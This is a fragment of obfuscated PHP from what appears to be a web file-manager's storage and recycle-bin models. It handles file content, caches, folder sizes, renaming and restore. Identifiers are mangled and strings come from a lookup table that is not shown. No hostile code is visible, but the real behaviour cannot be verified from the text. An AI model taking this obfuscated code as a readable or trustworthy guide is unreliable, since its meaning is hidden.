$_SERVER[„Ç©ñÎ©]; Model($é¹˜ëÑÆ[579])->eventAddDesc($Ûù¬ò×¬, $ƒùíÜõõ); return $this->metaSet($Ûù¬ò×¬, $é¹˜ëÑÆ[462], $ƒùíÜõõ); } public function setContent($ä½æƒÙ—, $¸Åì†§¾ = '') { $·îó¿€Ä =& $_SERVER[„Ç©ñÎ©]; $—”š×ò· = $this->sourceInfo($ä½æƒÙ—); $âØ¢±Ä‹ = $this->fileInfoGet($ä½æƒÙ—); if (!$âØ¢±Ä‹ || !$—”š×ò·) { return !1; } $¸ó¨Ì¡ = Model($·îó¿€Ä[480])->addFileByContent($¸Åì†§¾, $—”š×ò·[$·îó¿€Ä[32]]); $±ŞêàÅÜ = $this->fileHistory($—”š×ò·, $¸ó¨Ì¡[$·îó¿€Ä[477]], $¸ó¨Ì¡[$·îó¿€Ä[86]]); if (!$±ŞêàÅÜ) { return Model($·îó¿€Ä[480])->remove($¸ó¨Ì¡[$·îó¿€Ä[477]]); } $this->folderSizeReset($—”š×ò·[$·îó¿€Ä[441]]); return !0; } public function fileSubstr($©¢Å‘ØÍ, $ï¡„¸¼á, $Â±ñÒŞ¼) { $¸Ü‡û£Ü = $this->fileInfoGet($©¢Å‘ØÍ); if (!$¸Ü‡û£Ü) { return !1; } return IO::fileSubstr($¸Ü‡û£Ü[$_SERVER[„Ç©ñÎ©][94]], $ï¡„¸¼á, $Â±ñÒŞ¼); } public function fileInfoGet($ä±ØÑ‚Á) { $êµ¸áÎ· =& $_SERVER[„Ç©ñÎ©]; $µÂàòº± = $this->sourceInfo($ä±ØÑ‚Á); if (!$µÂàòº± || $µÂàòº±[$êµ¸áÎ·[419]]) { return !1; } $€¢‘åüù = $êµ¸áÎ·[483] . $µÂàòº±[$êµ¸áÎ·[477]]; $ÒæÙëû“ = _get(self::$cacheFileInfo, $€¢‘åüù); if ($ÒæÙëû“) { return $ÒæÙëû“; } $‹ÅıÓ¾ƒ = Model($êµ¸áÎ·[480])->fileInfo($µÂàòº±[$êµ¸áÎ·[477]]); if ($‹ÅıÓ¾ƒ) { $‹ÅıÓ¾ƒ[$êµ¸áÎ·[32]] = $µÂàòº±[$êµ¸áÎ·[32]]; } self::$cacheFileInfo[$€¢‘åüù] = $‹ÅıÓ¾ƒ; return $‹ÅıÓ¾ƒ; } private function folderChildrenNumber($Êšæıåè) { $â —Ú‰• =& $_SERVER[„Ç©ñÎ©]; $Å´»”¬€ = $this->sourceInfo($Êšæıåè); $Š¥·èİè = array($â —Ú‰•[599] => array($â —Ú‰•[559], $Å´»”¬€[$â —Ú‰•[530]] . $Êšæıåè . $â —Ú‰•[560]), $â —Ú‰•[596] => $Å´»”¬€[$â —Ú‰•[514]], $â —Ú‰•[439] => intval($Å´»”¬€[$â —Ú‰•[440]]), $â —Ú‰•[592] => 1); $İÚ‚ò÷ = $this->where($Š¥·èİè)->count(); $ÚÖ¨ª×« = $this->where($Š¥·èİè)->where(array($â —Ú‰•[592] => 0))->count(); return array($â —Ú‰•[90] => $ÚÖ¨ª×«, $â —Ú‰•[91] => $İÚ‚ò÷); } public function pathInfo($ˆ·Ş“ßó, $Ä·šÜ = false) { $ÂĞÉ»ºê =& $_SERVER[„Ç©ñÎ©]; $Ä·šÜ = !1; $ˆ·Ş“ßó = intval($ˆ·Ş“ßó); $«çü¢Ãß = $ÂĞÉ»ºê[470] . intval($Ä·šÜ) . $ÂĞÉ»ºê[395] . $ˆ·Ş“ßó; $Éœ³í®… = _get(self::$cachePathInfo, $«çü¢Ãß); if ($Éœ³í®…) { return $Éœ³í®…; } $ÃÜÍüĞÇ = $this->sourceInfo($ˆ·Ş“ßó); if (!$ÃÜÍüĞÇ) { return !1; } $ÃÜÍüĞÇ = $this->_listDataApplyItem($ÃÜÍüĞÇ, $Ä·šÜ); self::$cachePathInfo[$«çü¢Ãß] = $ÃÜÍüĞÇ; return $ÃÜÍüĞÇ; } public static $cachePathInfoMore = array(); public function pathInfoMore($šò¡ıüÆ) { $‰¸á»úŒ =& $_SERVER[„Ç©ñÎ©]; $²ø·ŸÒ = _get(self::$cachePathInfoMore, $šò¡ıüÆ); if ($²ø·ŸÒ) { return $²ø·ŸÒ; } $„ “Ù× = $this->pathInfo($šò¡ıüÆ); if (!$„ “Ù×) { return !1; } if ($„ “Ù×[$‰¸á»úŒ[419]] == $‰¸á»úŒ[98]) { $„ “Ù×[$‰¸á»úŒ[89]] = $this->folderChildrenNumber($šò¡ıüÆ); } self::$cachePathInfoMore[$šò¡ıüÆ] = $„ “Ù×; return $„ “Ù×; } public function sourceInfo($€¸İäà) { $òÕÈÔ”£ =& $_SERVER[„Ç©ñÎ©]; if (!$€¸İäà) { return array(); } $€¸İäà = intval($€¸İäà); $ùƒÓÔ•ö = $òÕÈÔ”£[469] . $€¸İäà; $Åş’ÎÇ = _get(self::$cacheSourceInfo, $ùƒÓÔ•ö); if ($Åş’ÎÇ) { return $Åş’ÎÇ; } $ş²´÷æ¼ = $this->where(array($òÕÈÔ”£[411] => $€¸İäà))->find(); self::$cacheSourceInfo[$ùƒÓÔ•ö] = $ş²´÷æ¼; return self::$cacheSourceInfo[$ùƒÓÔ•ö]; } public function sourceCacheClear($”ş¡é = false) { self::cacheClear($”ş¡é); } public static function cacheClear($Ë™„ó©Ä = false) { $Ææ»õÙ =& $_SERVER[„Ç©ñÎ©]; if ($Ë™„ó©Ä == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ææ»õÙ[469] . $Ë™„ó©Ä]); unset(self::$cachePathInfoMore[$Ë™„ó©Ä]); unset(self::$cachePathInfo[$Ææ»õÙ[2124] . $Ë™„ó©Ä]); unset(self::$cachePathInfo[$Ææ»õÙ[2125] . $Ë™„ó©Ä]); } public function metaSet($ûôã“ , $„›ÅğÀ = null, $›ş¿ßè = null) { $»¶âóæÈ = parent::metaSet($ûôã“ , $„›ÅğÀ, $›ş¿ßè); if ($»¶âóæÈ) { $this->sourceCacheClear($ûôã“ ); } return $»¶âóæÈ; } public function pathInfoByPath($şÖ ²¢¶, $“ºÑ¬ó) { $¥ÒÙ—¡ =& $_SERVER[„Ç©ñÎ©]; $Ú€ŠöÁ— = !$“ºÑ¬ó ? array() : explode($¥ÒÙ—¡[8], trim($“ºÑ¬ó, $¥ÒÙ—¡[8])); $ÉÁ–¬ß» = $şÖ ²¢¶; foreach ($Ú€ŠöÁ— as $ùÄæâ“°) { $¹åÉ™çÍ = array($¥ÒÙ—¡[441] => $ÉÁ–¬ß», $¥ÒÙ—¡[32] => $ùÄæâ“°); $¹…ƒÄüá = $this->where($¹åÉ™çÍ)->select(); if (!$¹…ƒÄüá) { return !1; } $¹…ƒÄüá = array_sort_by($¹…ƒÄüá, $¥ÒÙ—¡[440]); $ÉÁ–¬ß» = $¹…ƒÄüá[0][$¥ÒÙ—¡[411]]; } return $this->pathInfo($ÉÁ–¬ß», !0); } protected function updateModifyTime($¢ùÄÙÛ¡) { $¦Ìû¤…æ =& $_SERVER[„Ç©ñÎ©]; $³¼Ì°Ã¾ = defined($¦Ìû¤…æ[484]) ? USER_ID : $¦Ìû¤…æ[207]; if (!$¢ùÄÙÛ¡) { return; } if (!is_array($¢ùÄÙÛ¡)) { $¢ùÄÙÛ¡ = array($¢ùÄÙÛ¡); } foreach ($¢ùÄÙÛ¡ as $µ˜àŞ— => $ı—–ÃÔ’) { $¢ùÄÙÛ¡[$µ˜àŞ—] = intval($ı—–ÃÔ’); $this->sourceCacheClear($ı—–ÃÔ’); } $üşïÕ€‚ = array($¦Ìû¤…æ[411] => array($¦Ìû¤…æ[7], $¢ùÄÙÛ¡)); $ˆé™ÉÕ = array($¦Ìû¤…æ[598] => $³¼Ì°Ã¾, $¦Ìû¤…æ[433] => time()); $this->where($üşïÕ€‚)->save($ˆé™ÉÕ); } public function folderSizeReset($§‚ô‘¿ô, $¯Ó÷Õø¿ = false) { $õéÀÔ½ =& $_SERVER[„Ç©ñÎ©]; if ($this->statusIgnoreResetSpace) { return; } $ÁÚ×¹‚° = $this->sourceInfo($§‚ô‘¿ô); $ò€˜¥ÔÜ = $õéÀÔ½[2126] . $§‚ô‘¿ô; CacheLock::lock($ò€˜¥ÔÜ, 20); if ($¯Ó÷Õø¿ === !1) { $this->sourceCacheClear($§‚ô‘¿ô); $ÁÚ×¹‚° = $this->sourceInfo($§‚ô‘¿ô); $ªéÍ¹åß = array($õéÀÔ½[410] => $§‚ô‘¿ô, $õéÀÔ½[439] => 0); $£ğø§ÃÒ = $this->where($ªéÍ¹åß)->sum($õéÀÔ½[86]); $¯Ó÷Õø¿ = intval($£ğø§ÃÒ) - intval($ÁÚ×¹‚°[$õéÀÔ½[86]]); } if ($¯Ó÷Õø¿ == 0) { return CacheLock::unlock($ò€˜¥ÔÜ); } $©†ŞŠ‚ = $this->parentLevelArray($ÁÚ×¹‚°[$õéÀÔ½[530]]); if (!$©†ŞŠ‚) { $©†ŞŠ‚ = array(); } $©†ŞŠ‚[] = $ÁÚ×¹‚°[$õéÀÔ½[411]]; $ªéÍ¹åß = array($õéÀÔ½[411] => array($õéÀÔ½[427], $©†ŞŠ‚)); if ($¯Ó÷Õø¿ < 0) { $ªéÍ¹åß[$õéÀÔ½[86]] = array($õéÀÔ½[1014], abs($¯Ó÷Õø¿)); } $this->where($ªéÍ¹åß)->setAdd($õéÀÔ½[86], $¯Ó÷Õø¿); CacheLock::unlock($ò€˜¥ÔÜ); $ğ¸­¾¯ = $õéÀÔ½[2127] . $ÁÚ×¹‚°[$õéÀÔ½[420]] . $õéÀÔ½[4] . $ÁÚ×¹‚°[$õéÀÔ½[514]]; $•ÈèŠÃ÷ = array($ÁÚ×¹‚°[$õéÀÔ½[420]], $ÁÚ×¹‚°[$õéÀÔ½[514]]); TaskRun::timeLimitCall($ğ¸­¾¯, $õéÀÔ½[2128], $•ÈèŠÃ÷, 1.5); } public function folderSizeResetChildren($ëÁı¤Ğ¿) { $ŞİÁú§İ =& $_SERVER[„Ç©ñÎ©]; $this->sourceCacheClear($ëÁı¤Ğ¿); $È—±‡œ = $this->sourceInfo($ëÁı¤Ğ¿); $Â¬°Ì‡ˆ = array($ŞİÁú§İ[592] => 1, $ŞİÁú§İ[596] => $È—±‡œ[$ŞİÁú§İ[514]], $ŞİÁú§İ[599] => array($ŞİÁú§İ[559], $È—±‡œ[$ŞİÁú§İ[530]] . $ëÁı¤Ğ¿ . $ŞİÁú§İ[560])); $‡ÛÃå–‰ = $ŞİÁú§İ[2129]; $ÍÃ©š¼¼ = $this->field($‡ÛÃå–‰)->where($Â¬°Ì‡ˆ)->select(); $Â¬°Ì‡ˆ[$ŞİÁú§İ[419]] = 0; $Ü¿¶¾Ï€ = $this->field($‡ÛÃå–‰)->where($Â¬°Ì‡ˆ)->select(); if (!$Ü¿¶¾Ï€) { return; } $ÍÃ©š¼¼[] = $È—±‡œ; $ÍÃ©š¼¼ = array_to_keyvalue($ÍÃ©š¼¼, $ŞİÁú§İ[411]); foreach ($ÍÃ©š¼¼ as $Ì¸§éø’ => $š×¡çÀô) { $ÍÃ©š¼¼[$Ì¸§éø’][$ŞİÁú§İ[2130]] = $ÍÃ©š¼¼[$Ì¸§éø’][$ŞİÁú§İ[86]]; $ÍÃ©š¼¼[$Ì¸§éø’][$ŞİÁú§İ[86]] = 0; } foreach ($Ü¿¶¾Ï€ as $š×¡çÀô) { $€èšİğË = $š×¡çÀô[$ŞİÁú§İ[441]] . $ŞİÁú§İ[12]; if (!isset($ÍÃ©š¼¼[$€èšİğË])) { continue; } if ($š×¡çÀô[$ŞİÁú§İ[440]] == $ÍÃ©š¼¼[$€èšİğË][$ŞİÁú§İ[440]]) { $ÍÃ©š¼¼[$€èšİğË][$ŞİÁú§İ[86]] += $š×¡çÀô[$ŞİÁú§İ[86]]; } } foreach ($ÍÃ©š¼¼ as $š×¡çÀô) { $ıµ³Ôùš = $this->parentLevelArray($š×¡çÀô[$ŞİÁú§İ[530]]); foreach ($ıµ³Ôùš as $€èšİğË) { $€èšİğË = $€èšİğË . $ŞİÁú§İ[12]; if (!isset($ÍÃ©š¼¼[$€èšİğË])) { continue; } if ($š×¡çÀô[$ŞİÁú§İ[440]] == $ÍÃ©š¼¼[$€èšİğË][$ŞİÁú§İ[440]]) { $ÍÃ©š¼¼[$€èšİğË][$ŞİÁú§İ[86]] += $š×¡çÀô[$ŞİÁú§İ[86]]; } } } $ó”¢Ş°ë = array(); foreach ($ÍÃ©š¼¼ as $š×¡çÀô) { if ($š×¡çÀô[$ŞİÁú§İ[86]] == $š×¡çÀô[$ŞİÁú§İ[2130]]) { continue; } $ó”¢Ş°ë[] = array($ŞİÁú§İ[411], $š×¡çÀô[$ŞİÁú§İ[411]], $ŞİÁú§İ[86], $š×¡çÀô[$ŞİÁú§İ[86]]); } $this->saveAll($ó”¢Ş°ë); } public function userSpaceReset($ñâ™¨ºê = false) { $Š‹†ÏÆá =& $_SERVER[„Ç©ñÎ©]; $ø¬ÒØ¤ = $this->where(array($Š‹†ÏÆá[420] => self::TYPE_USER, $Š‹†ÏÆá[514] => $ñâ™¨ºê, $Š‹†ÏÆá[419] => 0))->sum($Š‹†ÏÆá[86]); $ø¬ÒØ¤ = !$ø¬ÒØ¤ || $ø¬ÒØ¤ <= 0 ? 0 : $ø¬ÒØ¤; Model($Š‹†ÏÆá[522])->userEdit($ñâ™¨ºê, array($Š‹†ÏÆá[1816] => $ø¬ÒØ¤)); } public function targetSpaceUpdate($õ­ÒùÛ÷, $ƒşÕš•µ) { $ä—É‹ëˆ =& $_SERVER[„Ç©ñÎ©]; if (!$ƒşÕš•µ) { return; } if (!in_array($õ­ÒùÛ÷, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¢¼¦ÜÌ› = $this->targetSpaceSize($õ­ÒùÛ÷, $ƒşÕš•µ); if ($õ­ÒùÛ÷ == self::TYPE_USER) { Model($ä—É‹ëˆ[522])->userEdit($ƒşÕš•µ, array($ä—É‹ëˆ[1816] => $¢¼¦ÜÌ›)); } else { if ($õ­ÒùÛ÷ == self::TYPE_GROUP) { Model($ä—É‹ëˆ[531])->groupEdit($ƒşÕš•µ, array($ä—É‹ëˆ[1816] => $¢¼¦ÜÌ›)); } } } public function targetSpaceSize($›İôÜˆ, $ÙÈ×ªø) { $ô®éüÓ =& $_SERVER[„Ç©ñÎ©]; $ë…öáô‰ = 0; $ƒÎ©¬À” = $this->sourceRoot($›İôÜˆ, $ÙÈ×ªø, !0); foreach ($ƒÎ©¬À” as $½¶ïùšş) { if (!$½¶ïùšş) { continue; } $ë…öáô‰ += floatval($½¶ïùšş[$ô®éüÓ[86]]); $¬í‡úëÙ = array($ô®éüÓ[599] => array($ô®éüÓ[559], $ô®éüÓ[540] . $½¶ïùšş[$ô®éüÓ[411]] . $ô®éüÓ[560])); $¨¤Ññ¤ƒ = Model($ô®éüÓ[438])->field($ô®éüÓ[426])->where($¬í‡úëÙ)->select(); $¨¤Ññ¤ƒ = array_to_keyvalue($¨¤Ññ¤ƒ, $ô®éüÓ[12], $ô®éüÓ[411]); $¨¤Ññ¤ƒ = array_unique(array_filter($¨¤Ññ¤ƒ)); if ($¨¤Ññ¤ƒ) { $¬í‡úëÙ = array($ô®éüÓ[426] => array($ô®éüÓ[427], $¨¤Ññ¤ƒ)); $ë…öáô‰ += floatval($this->where($¬í‡úëÙ)->sum($ô®éüÓ[86])); } } $ë…öáô‰ = !$ë…öáô‰ || $ë…öáô‰ <= 0 ? 0 : $ë…öáô‰; return $ë…öáô‰; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($†ô¤‘Ç) { return $this->fileTypeProfile($†ô¤‘Ç, SourceModel::TYPE_USER); } public function groupFileTypeProfile($‚ıÚÜÜ©) { return $this->fileTypeProfile($‚ıÚÜÜ©, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¶ÅæÈÑÎ, $ñ¡ëúü±) { $øã»§ßõ =& $_SERVER[„Ç©ñÎ©]; $Ë’ê¶àƒ = $øã»§ßõ[2131] . $¶ÅæÈÑÎ . $øã»§ßõ[11] . $ñ¡ëúü±; $Øö†ä›¢ = Cache::get($Ë’ê¶àƒ); if ($Øö†ä›¢) { return $Øö†ä›¢; } $»æ¢±´® = array($øã»§ßõ[592] => 0); if ($¶ÅæÈÑÎ != !1) { $»æ¢±´®[$øã»§ßõ[514]] = $¶ÅæÈÑÎ; $»æ¢±´®[$øã»§ßõ[420]] = $ñ¡ëúü±; } $ÎÎçıº° = array(); $ÎÎçıº°[$øã»§ßõ[2132]] = array($øã»§ßõ[2133] => LNG($øã»§ßõ[2132]), $øã»§ßõ[2134] => $this->where($»æ¢±´®)->count(), $øã»§ßõ[594] => $this->where($»æ¢±´®)->sum($øã»§ßõ[86])); $¢ÑöïÕ¦ = KodIO::fileTypeList(); foreach ($¢ÑöïÕ¦ as $ÌöÛ¨ƒ¶ => $èô·Ïñô) { $»æ¢±´®[$øã»§ßõ[421]] = $this->fileTypeWhere($ÌöÛ¨ƒ¶); $ÎÎçıº°[$ÌöÛ¨ƒ¶] = array($øã»§ßõ[2133] => $èô·Ïñô[$øã»§ßõ[32]], $øã»§ßõ[2134] => $this->where($»æ¢±´®)->count(), $øã»§ßõ[594] => $this->where($»æ¢±´®)->sum($øã»§ßõ[86])); } Cache::set($Ë’ê¶àƒ, $ÎÎçıº°, 1200); return $ÎÎçıº°; } public function fileNameExist($ˆœÆ¼, $Ê½á¼Óµ) { $’ôÎƒá… =& $_SERVER[„Ç©ñÎ©]; $ğüÒÑØ = $this->where(array($’ôÎƒá…[441] => $ˆœÆ¼, $’ôÎƒá…[32] => $Ê½á¼Óµ, $’ôÎƒá…[440] => 0))->find(); return is_array($ğüÒÑØ) ? $ğüÒÑØ[$’ôÎƒá…[411]] : !1; } public function childList($öÈ®„ µ) { $Ì‚‰‡Å =& $_SERVER[„Ç©ñÎ©]; $ìòÌŞÜŞ = $Ì‚‰‡Å[2109] . $öÈ®„ µ; if (isset(self::$cacheChildList[$ìòÌŞÜŞ])) { return self::$cacheChildList[$ìòÌŞÜŞ]; } $¨™äÀëª = array($Ì‚‰‡Å[441] => intval($öÈ®„ µ), $Ì‚‰‡Å[440] => 0); $ò¿¹ÃïŞ = $this->where($¨™äÀëª)->select(); $ò¿¹ÃïŞ = $ò¿¹ÃïŞ ? $ò¿¹ÃïŞ : array(); self::$cacheChildList[$ìòÌŞÜŞ] = $ò¿¹ÃïŞ; foreach ($ò¿¹ÃïŞ as $‹’ƒıáÙ) { $ìòÌŞÜŞ = $Ì‚‰‡Å[469] . $‹’ƒıáÙ[$Ì‚‰‡Å[411]]; self::$cacheSourceInfo[$ìòÌŞÜŞ] = $‹’ƒıáÙ; } return $ò¿¹ÃïŞ; } public function fileNameAuto($¿°Ğ¤®Û, $°åÇÍ‹Ù, $ñ¢Œã = REPEAT_RENAME, $¥¾‚àÙœ = false) { $¤Š„Â =& $_SERVER[„Ç©ñÎ©]; $åÛÁ™¦ñ = get_path_ext($°åÇÍ‹Ù); $Ñ×½ñü = $åÛÁ™¦ñ ? basename($°åÇÍ‹Ù, $¤Š„Â[10] . $åÛÁ™¦ñ) . $¤Š„Â[2135] . $åÛÁ™¦ñ : $°åÇÍ‹Ù . $¤Š„Â[393]; $‰âÛ–¸³ = array($¤Š„Â[441] => $¿°Ğ¤®Û, $¤Š„Â[440] => 0, $¤Š„Â[32] => array($¤Š„Â[392], $Ñ×½ñü)); $ˆºåŒß¤ = $this->field($¤Š„Â[32])->where($‰âÛ–¸³)->select(); $å±‡Œöä = array_to_keyvalue($ˆºåŒß¤, $¤Š„Â[12], $¤Š„Â[32]); return $this->fileNameAutoGet($å±‡Œöä, $°åÇÍ‹Ù, $ñ¢Œã, $¥¾‚àÙœ); } public function fileNameAutoGet($êâÎÔ¸Á, $ÄİÓ·Á, $§Ë ¤†Ö, $¥¢¾ú‹â) { $†µñ×é® =& $_SERVER[„Ç©ñÎ©]; if ($§Ë ¤†Ö == REPEAT_REPLACE || !$êâÎÔ¸Á || !in_array_not_case($ÄİÓ·Á, $êâÎÔ¸Á) || $¥¢¾ú‹â && $§Ë ¤†Ö != REPEAT_RENAME_FOLDER) { return $ÄİÓ·Á; } if ($§Ë ¤†Ö == REPEAT_SKIP) { return !1; } $ËÔ¢±ıÓ = $†µñ×é®[10] . get_path_ext($ÄİÓ·Á); $ËÔ¢±ıÓ = $ËÔ¢±ıÓ == $†µñ×é®[10] || $¥¢¾ú‹â ? $†µñ×é®[12] : $ËÔ¢±ıÓ; for ($Ê°’üõ¦ = 1; $Ê°’üõ¦ <= count($êâÎÔ¸Á) + 1; $Ê°’üõ¦++) { $„º²·…Ñ = substr($ÄİÓ·Á, 0, strlen($ÄİÓ·Á) - strlen($ËÔ¢±ıÓ)); $³ğÍ° = $„º²·…Ñ . "\50{$Ê°’üõ¦}\x29{$ËÔ¢±ıÓ}"; if (!in_array_not_case($³ğÍ°, $êâÎÔ¸Á)) { return $³ğÍ°; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\143\145\x5f\162\145\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\x65\124\151\155\x65", "\x74\x69\x6d\145", "\151\156\x73\145\x72\164", "\146\x75\x6e\x63\x74\151\157\x6e")); public function listData($åµ…ƒèı = false) { $‡ã±íÌ¿ =& $_SERVER[„Ç©ñÎ©]; $åµ…ƒèı = $åµ…ƒèı ? $åµ…ƒèı : USER_ID; $½§²³Ş = $this->where(array($‡ã±íÌ¿[1646] => $åµ…ƒèı))->select(); return array_to_keyvalue($½§²³Ş, $‡ã±íÌ¿[12], $‡ã±íÌ¿[411]); } public function moveToRecycle($¡åŒ¾ğ–) { $Û¢Ñ¿§‘ =& $_SERVER[„Ç©ñÎ©]; $¯ŸöÅ°î = Model($Û¢Ñ¿§‘[1326]); $¬Û™¸´ğ = $¯ŸöÅ°î->sourceInfo($¡åŒ¾ğ–); if (!$¬Û™¸´ğ || $¬Û™¸´ğ[$Û¢Ñ¿§‘[440]] == $Û¢Ñ¿§‘[98]) { return; } $êÎÔıÊ© = array($Û¢Ñ¿§‘[426] => $¡åŒ¾ğ–, $Û¢Ñ¿§‘[1646] => USER_ID, $Û¢Ñ¿§‘[595] => $¬Û™¸´ğ[$Û¢Ñ¿§‘[420]], $Û¢Ñ¿§‘[596] => $¬Û™¸´ğ[$Û¢Ñ¿§‘[514]], $Û¢Ñ¿§‘[599] => $¬Û™¸´ğ[$Û¢Ñ¿§‘[530]]); $this->add($êÎÔıÊ©); $this->recycleMove($¡åŒ¾ğ–, 1); if ($¬Û™¸´ğ[$Û¢Ñ¿§‘[419]] == $Û¢Ñ¿§‘[98]) { $œ´¯Ã¡ç = array($Û¢Ñ¿§‘[599] => array($Û¢Ñ¿§‘[559], $¬Û™¸´ğ[$Û¢Ñ¿§‘[530]] . $¡åŒ¾ğ– . $Û¢Ñ¿§‘[560])); $¯ŸöÅ°î->where($œ´¯Ã¡ç)->setField($Û¢Ñ¿§‘[440], 1); } } public function clear() { $this->remove(!1); } public function remove($©çşÍ‰Ø = false, $¡÷­«©­ = false) { $ŒÒ’âòÎ =& $_SERVER[„Ç©ñÎ©]; $¡÷­«©­ = $¡÷­«©­ ? $¡÷­«©­ : USER_ID; $À¥ˆõº• = Model($ŒÒ’âòÎ[1326]); $“å…¥¨œ = $this->listData($¡÷­«©­); $©çşÍ‰Ø = $©çşÍ‰Ø === !1 ? !1 : $©çşÍ‰Ø; $İ¨Ã³‹ƒ = array(); foreach ($“å…¥¨œ as $Ä´âùŠÇ) { if ($©çşÍ‰Ø != !1 && !in_array($Ä´âùŠÇ, $©çşÍ‰Ø)) { continue; } $–ÌÁÛİÅ = $À¥ˆõº•->sourceInfo($Ä´âùŠÇ); $À¥ˆõº•->remove($Ä´âùŠÇ, !1); $ËË—©˜‡ = $–ÌÁÛİÅ[$ŒÒ’âòÎ[420]] . $ŒÒ’âòÎ[11] . $–ÌÁÛİÅ[$ŒÒ’âòÎ[514]]; $İ¨Ã³‹ƒ[$ËË—©˜‡] = array($ŒÒ’âòÎ[595] => $–ÌÁÛİÅ[$ŒÒ’âòÎ[420]], $ŒÒ’âòÎ[514] => $–ÌÁÛİÅ[$ŒÒ’âòÎ[514]]); $this->where(array($ŒÒ’âòÎ[411] => $Ä´âùŠÇ))->delete(); } foreach ($İ¨Ã³‹ƒ as $ÖÛ–²ôü) { $À¥ˆõº•->targetSpaceUpdate($ÖÛ–²ôü[$ŒÒ’âòÎ[420]], $ÖÛ–²ôü[$ŒÒ’âòÎ[514]]); } } public function restore($È¡Ş×•« = false) { $Í«»¤İ = $this->listData(); $this->_restoreSource($Í«»¤İ, $È¡Ş×•«); } public function removeUserAll($Ğºˆ÷åÃ) { $this->remove(!1, $Ğºˆ÷åÃ); } private function _restoreSource($Ìóªóµ, $ñ‰êöûĞ) { $è†ìÏ å =& $_SERVER[„Ç©ñÎ©]; $ïíÍì‡Ê = Model($è†ìÏ å[1326]); $ñ‰êöûĞ = $ñ‰êöûĞ == !1 ? !1 : $ñ‰êöûĞ; if (!$Ìóªóµ) { return !0; } $ş…À…Ô = array(); foreach ($Ìóªóµ as $Óôúò‚è) { if ($ñ‰êöûĞ != !1 && !in_array($Óôúò‚è, $ñ‰êöûĞ)) { continue; } $Á’œ©ï  = $ïíÍì‡Ê->sourceInfo($Óôúò‚è); $’§ı´ûà = $ïíÍì‡Ê->sourceInfo($Á’œ©ï [$è†ìÏ å[441]]); if ($’§ı´ûà[$è†ìÏ å[440]] == $è†ìÏ å[98]) { continue; } $ïíÍì‡Ê->lockMoveStart($Óôúò‚è); $this->recycleMove($Óôúò‚è, 0); if ($Á’œ©ï [$è†ìÏ å[419]] == $è†ìÏ å[98]) { $üğÅ“½ = array($è†ìÏ å[599] => array($è†ìÏ å[559], $Á’œ©ï [$è†ìÏ å[530]] . $Óôúò‚è . $è†ìÏ å[560])); $ïíÍì‡Ê->where($üğÅ“½)->setField($è†ìÏ å[440], 0); $this->restoreFolderChildren($Óôúò‚è, $Ìóªóµ); } $this->where(array($è†ìÏ å[411] => $Óôúò‚è))->delete(); $ïíÍì‡Ê->folderSizeReset($Á’œ©ï [$è†ìÏ å[441]]); $ş…À…Ô[] = $Á’œ©ï [$è†ìÏ å[441]]; if ($Á’œ©ï [$è†ìÏ å[419]] == $è†ìÏ å[98]) { $ş…À…Ô[] = $Óôúò‚è; } $ïíÍì‡Ê->lockMoveEnd($Óôúò‚è); } $ïíÍì‡Ê->updateModifyTime($ş…À…Ô); } private function restoreFolderChildren($¾ƒ¥¥é, $¬“‹ô…æ) { $ĞÆ“Ãøæ =& $_SERVER[„Ç©ñÎ©]; $ŸÍ‰òú = Model($ĞÆ“Ãøæ[1326]); $èçŠÙ¸¦ = array($ĞÆ“Ãøæ[411] => array($ĞÆ“Ãøæ[7], array())); foreach ($¬“‹ô…æ as $¿„ƒîËô) { if ($¿„ƒîËô == $¾ƒ¥¥é) { continue; } if (!$ŸÍ‰òú->isParentOf($¾ƒ¥¥é, $¿„ƒîËô)) { continue; } $¦Éî‹°š = $ŸÍ‰òú->sourceInfo($¿„ƒîËô); if ($¦Éî‹°š[$ĞÆ“Ãøæ[419]] == $ĞÆ“Ãøæ[98]) { $èçŠÙ¸¦[] = array($ĞÆ“Ãøæ[599] => array($ĞÆ“Ãøæ[559], $¦Éî‹°š[$ĞÆ“Ãøæ[530]] . $¿„ƒîËô . $ĞÆ“Ãøæ[560])); } else { $èçŠÙ¸¦[$ĞÆ“Ãøæ[411]][1][] = $¿„ƒîËô; } } if (!$èçŠÙ¸¦[$ĞÆ“Ãøæ[411]][1]) { unset($èçŠÙ¸¦[$ĞÆ“Ãøæ[411]]); } if (!$èçŠÙ¸¦) { return; } $èçŠÙ¸¦[$ĞÆ“Ãøæ[411]][1] = array_unique($èçŠÙ¸¦[$ĞÆ“Ãøæ[411]][1]); $èçŠÙ¸¦[$ĞÆ“Ãøæ[999]] = $ĞÆ“Ãøæ[1925]; $ŸÍ‰òú->where($èçŠÙ¸¦)->setField($ĞÆ“Ãøæ[440], 1); } private function recycleMove($¥’§õè¸, $ğ»½íÚ– = 1) { $ïªÍââ£ =& $_SERVER[„Ç©ñÎ©]; $†è³ç˜Ú = Model($ïªÍââ£[1326]); $Ññ™ñÖ = Model($ïªÍââ£[2136]); $“ïƒÂ  = array($ïªÍââ£[411] => $¥’§õè¸); if ($ğ»½íÚ–) { $†è³ç˜Ú->where($“ïƒÂ )->setField($ïªÍââ£[440], 1); $Ññ™ñÖ->eventRecycle($¥’§õè¸, $ïªÍââ£[2137]); } else { $ëœ‰ëÔ· = $†è³ç˜Ú->where($“ïƒÂ )->find(); $¿„ü‚†ğ = $ëœ‰ëÔ·[$ïªÍââ£[419]] == $ïªÍââ£[98]; $Î½»ö×Å = $†è³ç˜Ú->fileNameAuto($ëœ‰ëÔ·[$ïªÍââ£[441]], $ëœ‰ëÔ·[$ïªÍââ£[32]], REPEAT_RENAME_FOLDER, $¿„ü‚†ğ); if ($Î½»ö×Å != $ëœ‰ëÔ·[$ïªÍââ£[32]]) { $†è³ç˜Ú->rename($¥’§õè¸, $Î½»ö×Å); } $†è³ç˜Ú->where($“ïƒÂ )->setField($ïªÍââ£[440], 0); $Ññ™ñÖ->eventRecycle($¥’§õè¸, $ïªÍââ£[2138]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = 